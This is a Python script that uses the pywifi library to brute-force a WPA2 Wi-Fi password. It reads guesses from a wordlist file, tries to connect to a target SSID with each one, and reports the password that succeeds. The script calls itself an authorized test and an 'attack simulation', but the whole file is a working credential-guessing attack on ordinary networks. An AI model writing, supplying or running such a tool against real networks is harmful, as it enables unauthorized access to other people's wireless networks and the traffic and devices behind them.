import pywifi
from pywifi import const
import time
import argparse
import sys

# Function to load passwords from a file
def load_passwords(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"\n:( File '{file_path}' not found.")
        sys.exit(1)

# Function to connect to Wi-Fi with a given profile
def connect_to_wifi(iface, profile):
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    time.sleep(5)
    return iface.status() == const.IFACE_CONNECTED


def main():
    # Argument parsing
    parser = argparse.ArgumentParser(description="Wi-Fi test script (authorized use only)")
    parser.add_argument("--ssid", required=True, help="Target Wi-Fi SSID")
    args = parser.parse_args()

    target_ssid = args.ssid

    # Wi-Fi interface
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    # Load passwords
    password_file = "passwords.txt"
    password_dict = load_passwords(password_file)

    # Scan networks
    iface.scan()
    time.sleep(5)
    scan_results = iface.scan_results()

    # Find target network
    target_network = None
    for network in scan_results:
        if network.ssid == target_ssid:
            target_network = network
            break

    if target_network is None:
        print(f"\n:( Network with SSID '{target_ssid}' not found.")
        return

    print(f"\n..:: ( •_•) Starting dictionary test on SSID: {target_ssid}")

    # Try passwords
    for idx, password in enumerate(password_dict, 1):
        print(f"\n==> Trying password {idx}/{len(password_dict)}: '{password}'")

        profile = pywifi.Profile()
        profile.ssid = target_ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        if connect_to_wifi(iface, profile):
            print("\n" + "=" * 52)
            print("[✔] SUCCESS: Valid credentials identified")
            print(f"SSID     : {target_ssid}")
            print(f"PASSWORD : {password}")
            print("Attack simulation stopped.")
            print("=" * 52 + "\n")
            iface.disconnect()
            return
        else:
            print(f"\n:( Attempt failed.")

    print("\n 눈_눈 Password not found in dictionary.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n:( Interrupted by user.")
    finally:
        print("\n...::: Finished :::...\n")
